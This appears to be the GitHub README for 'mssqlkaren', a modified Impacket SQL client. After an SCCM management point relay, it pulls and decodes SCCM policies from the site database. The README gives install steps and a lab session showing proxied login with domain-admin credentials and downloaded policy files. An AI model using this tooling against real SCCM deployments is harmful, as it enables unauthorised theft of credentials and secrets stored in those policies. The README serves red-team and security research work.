# mssqlkaren


<p align="center">
<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/ea210893-921b-46a6-a9d1-2b542dfb7880" />
</p>




## Updated mssqlclient.py to automate pulling policies after a mp relay to the sccm database shown [here](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)

## Installation

Requirements

```
uv
```

Install

```
git clone https://github.com/garrettfoster13/mssqlkaren.git
cd mssqlkaren
uv sync
```

## Usage
After the relay, proxy mssqlkaren.py and switch to the site database. Then just run `speak_to_the_manager` and the policy assignments and policies will be downloded and decoded to the `karen` dir in your cwd

```
proxychains uv run mssqlkaren.py ludus/domainadmin:password@10.6.10.13 -windows-auth
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(sccm-sql): Line 1: Changed database context to 'master'.
[*] INFO(sccm-sql): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (ludus.domain\domainadmin  dbo@master)> shell rm -rf karen/
SQL (ludus.domain\domainadmin  dbo@master)> use cm_123
ENVCHANGE(DATABASE): Old Value: master, New Value: CM_123
INFO(sccm-sql): Line 1: Changed database context to 'CM_123'.
SQL (ludus.domain\domainadmin  dbo@CM_123)> speak_to_the_manager
[*] Querying for x64 unknown computer guid
[*] Querying for Policy Assignments
[*] Querying for policy bodies
SQL (ludus.domain\domainadmin  dbo@CM_123)> shell ls -l karen/policies
total 1008
-rw-r--r--  1 garrettfoster  staff   2470 Aug 20 19:59 {114e816f-70aa-4da9-907f-7e14bb2b957a}.xml
-rw-r--r--  1 garrettfoster  staff   3042 Aug 20 19:59 {182d7bd0-cea6-4570-a4de-444774d09f42}.xml
-rw-r--r--  1 garrettfoster  staff   2540 Aug 20 19:59 {2053343a-1c1c-44ec-bec9-93780641594c}.xml
-rw-r--r--  1 garrettfoster  staff  19066 Aug 20 19:59 {234e8ae9-ec04-4d63-9ec7-268bec15ef2c}.xml
-rw-r--r--  1 garrettfoster  staff   6028 Aug 20 19:59 {258afa12-675f-4476-9565-57809e393c5e}.xml
-rw-r--r--  1 garrettfoster  staff  13005 Aug 20 19:59 {26e744a4-3509-4f02-89e5-fa8e9e3ae4cd}.xml
-rw-r--r--  1 garrettfoster  staff   3292 Aug 20 19:59 {27cc5fa3-4e63-4423-9aa7-451512f6d768}.xml
-rw-r--r--  1 garrettfoster  staff   2985 Aug 20 19:59 {2a6896cf-48e1-4f75-973b-08c98fdb622b}.xml
-rw-r--r--  1 garrettfoster  staff   1010 Aug 20 19:59 {2fd0ea60-add1-4f2d-8d67-b3453725889f}.xml
-rw-r--r--  1 garrettfoster  staff   1148 Aug 20 19:59 {3126f6e4-b123-4240-ad62-131ef797847a}.xml
-rw-r--r--  1 garrettfoster  staff   5786 Aug 20 19:59 {3d36d26a-4070-49f7-955c-acfc4cb990b5}.xml
-rw-r--r--  1 garrettfoster  staff   1354 Aug 20 19:59 {417e86f5-5f1e-4257-bfe9-4ece7a0ce349}.xml
-rw-r--r--  1 garrettfoster  staff    662 Aug 20 19:59 {43d41839-ab58-4f62-97a6-fa0e77fcde81}.xml
-rw-r--r--  1 garrettfoster  staff    184 Aug 20 19:59 {573ed3a8-e7b5-41a8-9147-1e8d6c63b7ee}.xml
-rw-r--r--  1 garrettfoster  staff    608 Aug 20 19:59 {5ab48cac-1069-45e9-9c63-0085c1c9ea4d}.xml
-rw-r--r--  1 garrettfoster  staff   1881 Aug 20 19:59 {61758974-eeec-4cc9-9653-10835f45b3bf}.xml
-rw-r--r--  1 garrettfoster  staff  14689 Aug 20 19:59 {65609f99-df85-4f18-b055-4fb83a88a8e8}.xml
-rw-r--r--  1 garrettfoster  staff  75048 Aug 20 19:59 {786182d4-e95f-46fb-aef7-4dd98cdd781f}.xml
<snipped>
```
